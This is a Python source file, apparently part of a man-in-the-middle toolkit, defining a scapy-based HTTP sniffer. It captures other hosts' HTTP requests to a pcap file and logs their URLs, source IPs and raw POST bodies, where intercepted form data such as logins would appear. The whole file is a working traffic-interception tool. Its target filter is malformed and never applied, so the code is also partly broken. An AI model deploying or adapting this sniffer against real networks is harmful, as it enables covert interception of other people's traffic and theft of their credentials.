from scapy.all import *
from scapy.layers.http import HTTPRequest
from multiprocessing import Process
from colorama import init, Fore
import logging,random

white   = Fore.WHITE
black   = Fore.BLACK
red     = Fore.RED
reset   = Fore.RESET
blue    = Fore.BLUE
cyan    = Fore.CYAN
yellow  = Fore.YELLOW
green   = Fore.GREEN
magenta = Fore.MAGENTA

def percentage(percent, whole):
	return (percent * whole) / 100.0

class HttpSniff(object):
	x = random.randint(1000,9999)
	def __init__(self,pcap_path=f"/usr/share/mitm.py/files/{x}-http.pcap", http_file=f"/usr/share/mitm.py/files/{x}-http.log",verbose=False,targets=""):
		self.pcap_path = pcap_path
		self.http_file = http_file 
		self.main_thread = None
		self.targets	= list(targets.split("/"))

		init()
		logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
		logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
		logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
		logging.addLevelName(logging.DEBUG, f"[{magenta}*{reset}]")
		logging.basicConfig(format=f"%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.DEBUG)
		
	def handle_packet(self, pkt):
		if pkt.haslayer(HTTPRequest):
		    wrpcap(self.pcap_path, pkt, append=True)
		
		    url    = pkt[HTTPRequest].Host.decode() + pkt[HTTPRequest].Path.decode()
		    ip     = pkt[IP].src
		    method = pkt[HTTPRequest].Method.decode()
		    raw    = None
		    if pkt.haslayer(Raw) and method == "POST":
			    raw = pkt[Raw].load
		
		    with open(self.http_file,"a+") as fd:
			    fd.write(f"{method} from {ip} to {url} {f'- Data: {raw.decode()}' if raw else ''}\n\n")
		
		    logging.info(f"HTTP {method} request from {ip} to {url[0:100]}")
		
	def sniff_thread(self):
		filter_ = f"port 80 and port 443 and port 8000 and port 8080{f' and host {x}' for x in self.targets}"
		sniff(prn=self.handle_packet)
		
	def start(self):
		logging.debug("HTTP: Starting sniff thread")
		self.main_thread = Process(target=self.sniff_thread)
		self.main_thread.start()
		
	def stop(self):
		logging.debug("HTTP: Sniff thread stopped")
		self.main_thread.kill()
		return (self.pcap_path, self.http_file)

if __name__ == "__main__":
    http = HttpSniff(verbose=True)
    http.start()

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(http.stop())